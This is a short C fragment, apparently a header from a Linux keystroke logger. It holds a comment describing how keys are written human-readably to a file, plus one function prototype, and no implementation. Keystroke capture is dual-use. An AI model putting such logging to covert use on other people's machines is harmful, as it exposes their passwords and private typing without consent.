/*  
    This will log keystrokes in a relatively raw but somewhat human-readable way 
    into the provided file.

    It handles shift, capslock, enter, and tab the way you might expect, mirroring 
    what the user likely sees. For all other special keys (backspace, ctrl, ...) 
    it merely prints out <BACKSPACE>, <CTRL>, etc., perhaps to be parsed by some 
    other program.

    Mapped for US standard keyboard layout.
*/
void log_keystroke_humanformat(FILE * file, struct input_event event);
